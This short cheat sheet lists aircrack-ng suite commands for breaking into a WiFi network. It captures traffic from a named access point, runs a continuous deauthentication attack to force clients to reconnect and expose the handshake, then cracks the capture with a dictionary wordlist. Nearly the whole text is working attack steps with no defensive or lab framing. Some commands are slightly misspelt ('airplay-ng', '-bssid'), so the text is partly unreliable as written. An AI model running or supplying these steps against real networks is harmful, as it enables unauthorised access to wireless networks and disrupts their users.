    * iwconfig -- To verify the configuration

    * airodump-ng mon0

    * airodump-ng -w OUTFILE -c 1 -bssid 58:6D:8F:A0:16:11 mon0 --w to write output
    to file

    * airplay-ng -0 0 -a 58:6D:8F:A0:16:11 mon0 -- Run while airodump-ng command is
    running to initiate a deauthentication so you can get the hash passwords on the
    file

    * aircrack-ng OUTFILE-01.cap -w /usr/share/passwords/wordlists/darkc0de.lst --
    Initiate a password attack to the wireless (Brute Force/Dictionary Attack)'
